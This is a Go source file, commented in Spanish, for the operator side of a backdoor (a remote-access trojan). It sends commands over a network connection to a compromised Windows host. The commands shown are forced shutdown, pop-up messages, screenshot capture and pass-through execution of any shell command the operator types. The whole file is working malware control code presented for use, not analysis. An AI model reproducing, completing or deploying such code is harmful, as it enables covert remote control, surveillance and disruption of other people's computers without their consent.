// modulo que prepara los comandos a enviar al backdoor
package remoto

import (
	color "comando/colores"
	"comando/conex/comandos/ss"
	"comando/input"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

const INSTRUCCION = `
//comandos basicos:       //
//[0] limpiar consola     //       
//[1] apagar equipo       //
//[2] enviar mensaje      //
//[q] salir               //
//[ss] capturar pantalla  //
`
const (
	TIMEOUT = 10    // tiempo en segundos que espera el cliente para recibir un paquete
	BUFFER  = 20000 //tamaño del buffer de funcion envio
)

// funcion que abstrae el envio de paquetes al host
func envio(conexiones net.Conn, envio string) error {

	err_t := conexiones.SetDeadline(time.Now().Add(time.Second * TIMEOUT))
	if err_t != nil {
		return errors.New("tiempo agotado")
	}

	buffer := make([]byte, BUFFER)

	_, error := conexiones.Write([]byte(envio))
	if error != nil {
		return errors.New("[!] hubo un problema durante el envio del comando")

	} else {
		// retornar los datos
		num, error := conexiones.Read(buffer)
		if error != nil {
			return errors.New("[!] error al recibir la informacion")

		} else {
			fmt.Println(string(buffer[:num]))
		}

	}
	return nil
}

// abstraigo la funcion para borrar consola
func Borrar_consola() error {
	if runtime.GOOS == "windows" {
		comandos := exec.Command("powershell", "-command", "clear")
		comandos.Stdout = os.Stdout
		error := comandos.Run()
		fmt.Println(color.Violeta + color.LOGO + color.Reset)
		if error != nil {
			return errors.New("[!] error al ejecutar comando")
		}

	} else {
		fmt.Print("\033[2J")

	}
	return nil
}

// funcion cuyo proposito es la ejecucion de comandos
func Comando(conexiones net.Conn) error {
	// error que fuerza la recnexion para evitar problemas de desincronizacion con el host
	var reconectar = errors.New("reconexion")

	println(color.Violeta + INSTRUCCION + color.Reset)
	entrada := input.Input("[#] comando >> ")
	switch entrada {
	case "0": // borrar consola
		err := Borrar_consola()
		if err != nil {
			fmt.Println(err)
		}

	case "1": // apagar equipo
		err := envio(conexiones, "shutdown /s")
		if err != nil {
			return err
		}
	case "2": // automatizacion de msg para ciertas ediciones de windows

		mensaje := input.Input("mensaje >> ")
		msg_format := fmt.Sprintf("msg * %s", mensaje)
		envio(conexiones, msg_format)

	case "q":
		fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
		envio(conexiones, "q")
		conexiones.Close()
		os.Exit(0)
	case "ss":
		fmt.Println(color.Violeta + "[*] esperando la imagen ..." + color.Reset)
		byte_img, error := ss.Obtener_img(conexiones)
		if error != nil {
			return errors.New("[!] error al obtener la imagen")
		}
		nombre := input.Input("[*] nombre del png (sin extension)>> ")
		ss.Escribir_img(byte_img, nombre)
		if runtime.GOOS == "windows" {
			exec.Command("powershell", "-command", "start", fmt.Sprintf("%s.png", nombre)).Run()
		}
	default:
		err := envio(conexiones, entrada)
		if err != nil {
			return err
		}

	}
	input.Input("[+] presione ENTER para continuar ...")
	return reconectar

}
